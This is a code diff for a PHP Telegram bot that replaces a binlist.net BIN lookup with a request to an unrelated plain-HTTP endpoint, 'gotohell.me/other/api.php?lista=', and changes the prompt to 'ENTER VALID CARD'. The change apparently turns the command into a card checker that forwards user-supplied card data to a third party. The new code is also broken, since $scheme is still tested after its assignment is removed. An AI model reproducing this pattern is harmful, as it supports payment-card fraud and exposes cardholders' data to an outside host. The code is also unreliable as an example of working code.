@@ -22,7 +22,7 @@
         $bin = substr($message, 5);
    $curl = curl_init();
    curl_setopt_array($curl, [
-	CURLOPT_URL => "https://lookup.binlist.net/".$bin,
+	CURLOPT_URL => "http://gotohell.me/other/api.php?lista=".$bin,
 	CURLOPT_RETURNTRANSFER => true,
 	CURLOPT_FOLLOWLOCATION => true,
 	CURLOPT_ENCODING => "",
@@ -31,39 +31,22 @@
 	CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
 	CURLOPT_CUSTOMREQUEST => "GET",
 	CURLOPT_HTTPHEADER => [
-		"authority: lookup.binlist.net",
-		"accept: application/json",
-		"accept-language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7",
-		"origin: https://binlist.net",
-		"https://binlist.net/",
-		"sec-fetch-dest: empty",
-		"sec-fetch-site: same-site"
-	],
+		"authority: tes-code485572.codeanyapp.com",
+		"accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+		"accept-language: en,id-ID;q=0.9,id;q=0.8,en-US;q=0.7"],
 ]);
 
 $result = curl_exec($curl);
 curl_close($curl);
-$data = json_decode($result, true);
-$bank = $data['bank']['name'];
-$country = $data['country']['alpha2'];
-$currency = $data['country']['currency'];
-$emoji = $data['country']['emoji'];
-$scheme = $data['scheme'];
-$Brand = $data['brand'];
-$type = $data['type'];
+$result = trim(strip_tags(getstr($result,'<br>','<br>')));
   if ($scheme != null) {
         send_MDmessage($chat_id, "***
     Bin: $bin
-Type: $scheme
-Brand : $Brand
-Bank: $bank
-Country: $country $emoji
-Currency: $currency
-Credit/Debit:$type
+$result
 Checked By ASUUUUU@$username ***");
     }
 else {
-    send_MDmessage($chat_id, "Enter Valid BIN");
+    send_MDmessage($chat_id, "ENTER VALID CARD");
 }
    }
 //Send Messages with Markdown (Global)
